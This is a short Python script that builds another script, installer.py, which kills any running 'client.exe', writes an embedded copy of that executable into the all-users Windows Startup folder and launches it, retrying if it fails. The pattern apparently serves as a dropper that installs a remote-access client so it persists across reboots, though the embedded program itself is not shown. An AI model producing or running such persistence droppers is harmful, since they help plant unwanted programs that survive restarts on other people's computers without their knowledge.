script=f"""import time,os,psutil
def main():
    for process in psutil.process_iter():
        if process.name()=="client.exe":
            process.terminate()
            print("Killed")
    for process in psutil.process_iter():
        if process.name()=="client.exe":
            process.terminate()
            print("Killed")
    time.sleep(1)
    startup_path="C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/client.exe"
    payload={open("client.exe","rb").read()}
    open(startup_path,"wb").write(payload)
    print("Installed")
    os.startfile("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/client.exe")
    print("Started")
if __name__=='__main__':
    try:
        main()
    except Exception as e:
        print(e)
        main()
    finally:
        time.sleep(10)
"""

open("installer.py","w").write(script)